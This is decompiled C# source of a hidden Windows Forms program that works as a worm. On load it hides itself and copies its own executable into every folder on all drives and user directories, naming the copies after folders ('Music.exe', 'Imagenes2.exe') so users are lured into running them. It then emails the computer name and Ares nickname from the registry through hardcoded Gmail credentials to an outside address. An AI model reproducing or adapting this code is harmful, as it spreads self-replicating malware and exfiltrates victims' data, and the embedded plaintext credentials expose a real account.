using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Folder.My;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using Microsoft.Win32;

namespace Folder;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("ListBox1")]
	private ListBox _ListBox1;

	[AccessedThroughProperty("ListBox2")]
	private ListBox _ListBox2;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("TabControl1")]
	private TabControl _TabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("TabPage3")]
	private TabPage _TabPage3;

	[AccessedThroughProperty("ListBox3")]
	private ListBox _ListBox3;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	private object ext;

	private object FCm;

	internal virtual ListBox ListBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox1 = value;
		}
	}

	internal virtual ListBox ListBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox2 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual TabControl TabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual TabPage TabPage3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage3 = value;
		}
	}

	internal virtual ListBox ListBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ListBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ListBox3 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		ext = ".exe";
		FCm = Application.get_ExecutablePath();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_0326: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b3: Unknown result type (might be due to invalid IL or missing references)
		//IL_0440: Unknown result type (might be due to invalid IL or missing references)
		ListBox1 = new ListBox();
		ListBox2 = new ListBox();
		ComboBox1 = new ComboBox();
		Button1 = new Button();
		TabControl1 = new TabControl();
		TabPage1 = new TabPage();
		TabPage2 = new TabPage();
		TabPage3 = new TabPage();
		ListBox3 = new ListBox();
		CheckBox1 = new CheckBox();
		((Control)TabControl1).SuspendLayout();
		((Control)TabPage1).SuspendLayout();
		((Control)TabPage2).SuspendLayout();
		((Control)TabPage3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)ListBox1).set_Anchor((AnchorStyles)6);
		((ListControl)ListBox1).set_FormattingEnabled(true);
		ListBox listBox = ListBox1;
		Point location = new Point(3, -408);
		((Control)listBox).set_Location(location);
		((Control)ListBox1).set_Name("ListBox1");
		ListBox listBox2 = ListBox1;
		Size size = new Size(882, 394);
		((Control)listBox2).set_Size(size);
		((Control)ListBox1).set_TabIndex(0);
		((Control)ListBox2).set_Dock((DockStyle)5);
		((ListControl)ListBox2).set_FormattingEnabled(true);
		ListBox listBox3 = ListBox2;
		location = new Point(3, 3);
		((Control)listBox3).set_Location(location);
		((Control)ListBox2).set_Name("ListBox2");
		ListBox listBox4 = ListBox2;
		size = new Size(0, 4);
		((Control)listBox4).set_Size(size);
		((Control)ListBox2).set_TabIndex(1);
		((Control)ComboBox1).set_Anchor((AnchorStyles)6);
		((ListControl)ComboBox1).set_FormattingEnabled(true);
		ComboBox comboBox = ComboBox1;
		location = new Point(84, -17);
		((Control)comboBox).set_Location(location);
		((Control)ComboBox1).set_Name("ComboBox1");
		ComboBox comboBox2 = ComboBox1;
		size = new Size(121, 21);
		((Control)comboBox2).set_Size(size);
		((Control)ComboBox1).set_TabIndex(2);
		((Control)Button1).set_Anchor((AnchorStyles)6);
		Button button = Button1;
		location = new Point(3, -15);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(3);
		((ButtonBase)Button1).set_Text("propagarse");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)TabControl1).set_Anchor((AnchorStyles)15);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage1);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage2);
		((Control)TabControl1).get_Controls().Add((Control)(object)TabPage3);
		TabControl tabControl = TabControl1;
		location = new Point(3, 2);
		((Control)tabControl).set_Location(location);
		((Control)TabControl1).set_Name("TabControl1");
		TabControl1.set_SelectedIndex(0);
		TabControl tabControl2 = TabControl1;
		size = new Size(0, 0);
		((Control)tabControl2).set_Size(size);
		((Control)TabControl1).set_TabIndex(4);
		((Control)TabPage1).get_Controls().Add((Control)(object)ListBox1);
		TabPage tabPage = TabPage1;
		location = new Point(4, 22);
		tabPage.set_Location(location);
		((Control)TabPage1).set_Name("TabPage1");
		TabPage tabPage2 = TabPage1;
		Padding padding = default(Padding);
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage2).set_Padding(padding);
		TabPage tabPage3 = TabPage1;
		size = new Size(0, 0);
		((Control)tabPage3).set_Size(size);
		TabPage1.set_TabIndex(0);
		TabPage1.set_Text("TabPage1");
		TabPage1.set_UseVisualStyleBackColor(true);
		((Control)TabPage2).get_Controls().Add((Control)(object)ListBox2);
		TabPage tabPage4 = TabPage2;
		location = new Point(4, 22);
		tabPage4.set_Location(location);
		((Control)TabPage2).set_Name("TabPage2");
		TabPage tabPage5 = TabPage2;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage5).set_Padding(padding);
		TabPage tabPage6 = TabPage2;
		size = new Size(0, 0);
		((Control)tabPage6).set_Size(size);
		TabPage2.set_TabIndex(1);
		TabPage2.set_Text("TabPage2");
		TabPage2.set_UseVisualStyleBackColor(true);
		((Control)TabPage3).get_Controls().Add((Control)(object)ListBox3);
		TabPage tabPage7 = TabPage3;
		location = new Point(4, 22);
		tabPage7.set_Location(location);
		((Control)TabPage3).set_Name("TabPage3");
		TabPage tabPage8 = TabPage3;
		((Padding)(ref padding))._002Ector(3);
		((Control)tabPage8).set_Padding(padding);
		TabPage tabPage9 = TabPage3;
		size = new Size(0, 0);
		((Control)tabPage9).set_Size(size);
		TabPage3.set_TabIndex(2);
		TabPage3.set_Text("TabPage3");
		TabPage3.set_UseVisualStyleBackColor(true);
		((Control)ListBox3).set_Dock((DockStyle)5);
		((ListControl)ListBox3).set_FormattingEnabled(true);
		ListBox listBox5 = ListBox3;
		location = new Point(3, 3);
		((Control)listBox5).set_Location(location);
		((Control)ListBox3).set_Name("ListBox3");
		ListBox listBox6 = ListBox3;
		size = new Size(0, 4);
		((Control)listBox6).set_Size(size);
		((Control)ListBox3).set_TabIndex(2);
		((Control)CheckBox1).set_Anchor((AnchorStyles)6);
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox checkBox = CheckBox1;
		location = new Point(342, -15);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(107, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(5);
		((ButtonBase)CheckBox1).set_Text("terseras carpetas");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(10, 10);
		((Form)this).set_ClientSize(size);
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)CheckBox1);
		((Control)this).get_Controls().Add((Control)(object)TabControl1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)ComboBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)4);
		((Control)TabControl1).ResumeLayout(false);
		((Control)TabPage1).ResumeLayout(false);
		((Control)TabPage2).ResumeLayout(false);
		((Control)TabPage3).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void pro()
	{
		ComboBox1.get_Items().AddRange((object[])Directory.GetLogicalDrives());
		ComboBox1.get_Items().Add((object)Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
		ComboBox1.get_Items().Add((object)Environment.GetFolderPath(Environment.SpecialFolder.Personal));
		checked
		{
			int num = ComboBox1.get_Items().get_Count() - 1;
			for (int i = 0; i <= num; i++)
			{
				try
				{
					foreach (string directory in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Conversions.ToString(ComboBox1.get_Items().get_Item(i)), (SearchOption)2, new string[0]))
					{
						ListBox1.get_Items().Add((object)directory);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				ListBox1.get_Items().Remove((object)"D:\\$RECYCLE.BIN");
				ListBox1.get_Items().Remove((object)"D:\\System Volume Information");
				ListBox1.get_Items().Remove((object)"C:\\$RECYCLE.BIN");
				ListBox1.get_Items().Remove((object)"C:\\System Volume Information");
				ListBox1.get_Items().Remove((object)"E:\\$RECYCLE.BIN");
				ListBox1.get_Items().Remove((object)"E:\\System Volume Information");
				ListBox1.get_Items().Remove((object)"F:\\$RECYCLE.BIN");
				ListBox1.get_Items().Remove((object)"F:\\System Volume Information");
			}
			int num2 = ListBox1.get_Items().get_Count() - 1;
			for (int j = 0; j <= num2; j++)
			{
				object obj = RuntimeHelpers.GetObjectValue(ListBox1.get_Items().get_Item(j));
				int num3 = ComboBox1.get_Items().get_Count() - 1;
				for (int k = 0; k <= num3; k++)
				{
					obj = obj.ToString()!.Replace(Conversions.ToString(ComboBox1.get_Items().get_Item(k)), "");
					((Form)this).set_Text(Conversions.ToString(obj));
				}
				((Form)this).set_Text(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(ListBox1.get_Items().get_Item(j), (object)"\\"), obj), (object)".exe")));
				try
				{
					File.Copy(Conversions.ToString(FCm), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(ListBox1.get_Items().get_Item(j), (object)"\\"), obj), ext)));
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			int num4 = ListBox1.get_Items().get_Count() - 1;
			for (int l = 0; l <= num4; l++)
			{
				try
				{
					foreach (string directory2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Conversions.ToString(ListBox1.get_Items().get_Item(l)), (SearchOption)2, new string[0]))
					{
						ListBox2.get_Items().Add((object)directory2);
					}
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
			}
			int num5 = ListBox2.get_Items().get_Count() - 1;
			for (int m = 0; m <= num5; m++)
			{
				object obj2 = RuntimeHelpers.GetObjectValue(ListBox2.get_Items().get_Item(m));
				int num6 = ListBox1.get_Items().get_Count() - 1;
				for (int n = 0; n <= num6; n++)
				{
					obj2 = obj2.ToString()!.Replace(Conversions.ToString(ListBox1.get_Items().get_Item(n)), "");
					((Form)this).set_Text(Conversions.ToString(obj2));
				}
				try
				{
					File.Copy(Conversions.ToString(FCm), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(ListBox2.get_Items().get_Item(m), obj2), ext)));
				}
				catch (Exception projectError4)
				{
					ProjectData.SetProjectError(projectError4);
					ProjectData.ClearProjectError();
				}
			}
			foreach (string directory3 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), (SearchOption)2, new string[0]))
			{
				try
				{
					File.Copy(Conversions.ToString(FCm), Conversions.ToString(Operators.ConcatenateObject((object)(directory3 + "\\Music"), ext)));
				}
				catch (Exception projectError5)
				{
					ProjectData.SetProjectError(projectError5);
					ProjectData.ClearProjectError();
				}
			}
			foreach (string directory4 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), (SearchOption)2, new string[0]))
			{
				try
				{
					File.Copy(Conversions.ToString(FCm), Conversions.ToString(Operators.ConcatenateObject((object)(directory4 + "\\Imagenes2"), ext)));
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
			}
			foreach (string directory5 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.Personal), (SearchOption)2, new string[0]))
			{
				try
				{
					File.Copy(Conversions.ToString(FCm), Conversions.ToString(Operators.ConcatenateObject((object)(directory5 + "\\Imagenes2"), ext)));
				}
				catch (Exception projectError7)
				{
					ProjectData.SetProjectError(projectError7);
					ProjectData.ClearProjectError();
				}
			}
			foreach (string directory6 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.StartMenu), (SearchOption)2, new string[0]))
			{
				try
				{
					File.Copy(Conversions.ToString(FCm), Conversions.ToString(Operators.ConcatenateObject((object)(directory6 + "\\Imagenes2"), ext)));
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
			}
			if (CheckBox1.get_Checked())
			{
				return;
			}
			int num7 = ListBox2.get_Items().get_Count() - 1;
			for (int num8 = 0; num8 <= num7; num8++)
			{
				try
				{
					foreach (string directory7 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectories(Conversions.ToString(ListBox2.get_Items().get_Item(num8)), (SearchOption)2, new string[0]))
					{
						ListBox3.get_Items().Add((object)directory7);
					}
				}
				catch (Exception projectError9)
				{
					ProjectData.SetProjectError(projectError9);
					ProjectData.ClearProjectError();
				}
			}
			int num9 = ListBox3.get_Items().get_Count() - 1;
			for (int num10 = 0; num10 <= num9; num10++)
			{
				object obj3 = RuntimeHelpers.GetObjectValue(ListBox3.get_Items().get_Item(num10));
				int num11 = ListBox2.get_Items().get_Count() - 1;
				for (int num12 = 0; num12 <= num11; num12++)
				{
					obj3 = obj3.ToString()!.Replace(Conversions.ToString(ListBox2.get_Items().get_Item(num12)), "");
					((Form)this).set_Text(Conversions.ToString(obj3));
				}
				try
				{
					File.Copy(Conversions.ToString(FCm), Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(ListBox3.get_Items().get_Item(num10), obj3), ext)));
				}
				catch (Exception projectError10)
				{
					ProjectData.SetProjectError(projectError10);
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		pro();
		send();
		((Form)this).Close();
	}

	private void send()
	{
		try
		{
			SmtpClient smtpClient = new SmtpClient();
			MailMessage mailMessage = new MailMessage();
			smtpClient.Credentials = new NetworkCredential("correogeneralmsn@gmail.com", "fantasma477123456");
			smtpClient.Port = 587;
			smtpClient.Host = "smtp.gmail.com";
			smtpClient.EnableSsl = true;
			mailMessage = new MailMessage();
			mailMessage.From = new MailAddress("correogeneralmsn@gmail.com");
			mailMessage.To.Add("yonathan477@hotmail.com");
			mailMessage.Subject = ((ServerComputer)MyProject.Computer).get_Name() + "  clic";
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Ares", "Personal.Nickname", "no nick"));
			mailMessage.Body = Conversions.ToString(objectValue);
			smtpClient.Send(mailMessage);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
